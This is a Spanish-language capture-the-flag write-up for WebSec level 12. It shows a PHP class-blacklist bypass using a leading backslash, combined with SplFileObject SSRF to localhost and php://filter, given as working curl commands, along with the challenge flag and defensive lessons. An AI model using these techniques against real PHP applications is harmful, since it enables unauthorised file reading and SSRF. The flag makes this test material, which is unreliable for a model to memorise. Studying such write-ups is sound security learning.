# SOLUCIÓN WEBSEC LEVEL12 - This time, it's different

## FLAG
```
WEBSEC{Many_thanks_to_hackyou2014_web400_MSLC_L<3}
```

## RESUMEN DE LA VULNERABILIDAD

La aplicación permite instanciar clases PHP arbitrarias con dos parámetros, con algunas clases bloqueadas:
- `splfileobject`
- `globiterator`
- `filesystemiterator`
- `directoryiterator`

La vulnerabilidad combina:
1. **Blacklist Bypass** usando namespaces con backslash (`\ClassName`)
2. **SSRF (Server Side Request Forgery)** para leer desde localhost
3. **PHP Wrappers** para leer contenido completo

## CÓDIGO VULNERABLE

```php
$class = strtolower($_POST['class']);

if (in_array($class, ['splfileobject', 'globiterator', 'directoryiterator', 'filesystemiterator'])) {
    die('Dangerous class detected.');
} else {
    $result = new $class($_POST['param1'], $_POST['param2']);
    echo '<br><hr><br><div class="row"><pre>' . $result . '</pre></div>';
}
```

El código también contiene una sección que solo funciona desde `127.0.0.1`:
```php
if ($_SERVER['REMOTE_ADDR'] === '127.0.0.1') {
    // ... código que descifra y muestra la flag
}
```

## ANÁLISIS

### Por qué "This time, it's different"

El título del reto da la pista clave: **es diferente** porque:
1. Las clases están bloqueadas por nombre en lowercase
2. PERO PHP permite usar **namespace global** con `\ClassName`
3. Cuando usas `\SplFileObject`, PHP primero normaliza a `SplFileObject`
4. Pero el filtro compara con `strtolower($_POST['class'])` = `\splfileobject` (con backslash)
5. `\splfileobject` !== `splfileobject` → ¡Bypass exitoso!

### La trampa adicional

La flag no está en un archivo accesible directamente. Está en el código PHP pero solo se muestra si:
- La petición viene de `127.0.0.1` (localhost)
- Se accede con condiciones específicas

Solución: **SSRF usando SplFileObject**

## EXPLOTACIÓN

### Paso 1: Bypassear la blacklist

Usar `\` al inicio del nombre de clase:
```
class = \SplFileObject
```

PHP interpreta `\SplFileObject` como "SplFileObject del namespace global".
El filtro compara `strtolower('\SplFileObject')` = `\splfileobject` con `splfileobject` → No coincide → ¡Bypass!

### Paso 2: Confirmar el bypass

```bash
curl -X POST https://websec.fr/level12/index.php \
  -d "class=\SplFileObject" \
  -d "param1=index.php" \
  -d "param2=r"
```

Resultado: Lee `index.php` exitosamente ✓

### Paso 3: SSRF para acceder desde localhost

`SplFileObject` puede leer desde URLs usando wrappers de PHP.

```bash
curl -X POST https://websec.fr/level12/index.php \
  -d "class=\SplFileObject" \
  -d "param1=http://127.0.0.1/level12/index.php" \
  -d "param2=r"
```

Esto hace que el servidor PHP:
1. Cree un `SplFileObject` con URL `http://127.0.0.1/level12/index.php`
2. Haga una petición HTTP desde el servidor a sí mismo
3. `$_SERVER['REMOTE_ADDR']` = `127.0.0.1` ✓
4. El código especial se ejecuta y genera la flag

### Paso 4: Leer todo el contenido con php://filter

`SplFileObject` con `__toString()` solo muestra la **primera línea**.
Para leer TODO el contenido, usar `php://filter`:

```bash
curl -X POST https://websec.fr/level12/index.php \
  -d "class=\SplFileObject" \
  -d "param1=php://filter/convert.base64-encode/resource=http://127.0.0.1/level12/index.php" \
  -d "param2=r"
```

Esto:
1. Lee desde `http://127.0.0.1/level12/index.php`
2. La petición viene de localhost → código especial se ejecuta
3. `php://filter` convierte TODO a base64
4. `SplFileObject` muestra la primera línea del base64 (pero como es una línea larga, incluye todo)

### Paso 5: Decodificar la flag

El output al final contiene:
```
V0VCU0VDe01hbnlfdGhhbmtzX3RvX2hhY2t5b3UyMDE0X3dlYjQwMF9NU0xDX0w8M30=
```

Decodificar:
```bash
echo "V0VCU0VDe01hbnlfdGhhbmtzX3RvX2hhY2t5b3UyMDE0X3dlYjQwMF9NU0xDX0w8M30=" | base64 -d
```

Resultado: `WEBSEC{Many_thanks_to_hackyou2014_web400_MSLC_L<3}`

## COMANDO COMPLETO

```bash
curl -s -X POST https://websec.fr/level12/index.php \
  -d "class=\SplFileObject" \
  -d "param1=php://filter/convert.base64-encode/resource=http://127.0.0.1/level12/index.php" \
  -d "param2=r" \
| grep -oP 'V0VCU0VDe[^<]+' \
| base64 -d
```

## LECCIONES APRENDIDAS

1. **Las blacklists son difíciles de implementar correctamente**:
   - El filtro no consideró namespaces con backslash
   - `\ClassName` !== `classname` en la comparación
   - PHP normaliza `\ClassName` a `ClassName` al instanciar

2. **SSRF (Server Side Request Forgery) es poderoso**:
   - Permitió acceder a contenido solo disponible para localhost
   - PHP wrappers (`http://`, `php://filter`) amplifican el ataque
   - Siempre validar y sanitizar URLs en instanciación de clases

3. **PHP Object Instantiation es peligroso**:
   - Permitir instanciar clases arbitrarias es muy riesgoso
   - Incluso con blacklist, hay muchas clases que pueden ser abusadas
   - `SplFileObject`, `GlobIterator`, etc. pueden leer archivos
   - `SoapClient`, `PDO`, etc. pueden hacer requests de red

4. **Defense in depth**:
   - No confiar solo en blacklists
   - Validar en múltiples niveles
   - Considerar ALL las formas en que PHP normaliza/procesa input
   - Whitelist > Blacklist

5. **PHP Wrappers son herramientas poderosas**:
   - `php://filter` permite manipular streams
   - `http://`, `https://`, `ftp://` permiten requests remotas
   - Combinados con clases como `SplFileObject`, amplían vectores de ataque

## BYPASS TÉCNICO DETALLADO

```php
// Input del atacante
$_POST['class'] = '\SplFileObject';

// Código vulnerable
$class = strtolower($_POST['class']);
// $class = '\splfileobject'

if (in_array($class, ['splfileobject', ...])) {
    // \splfileobject !== splfileobject → false
    // NO entra aquí
} else {
    // Instancia la clase
    $result = new $class(...);
    // PHP evalúa: new \SplFileObject(...)
    // PHP normaliza: \SplFileObject → SplFileObject
    // ¡Se instancia la clase bloqueada!
}
```

## ARCHIVOS CREADOS
- `analisis.txt` - Análisis inicial
- `index_decoded.php` - Código fuente decodificado
- `decrypt_flag.php` - Intentos de descifrado criptográfico
- `bruteforce_key.php` - Análisis de la key XOR
- `deduce_key.php` - Deducción de la key
- `FLAG.txt` - La flag obtenida
- `SOLUCION.md` - Este archivo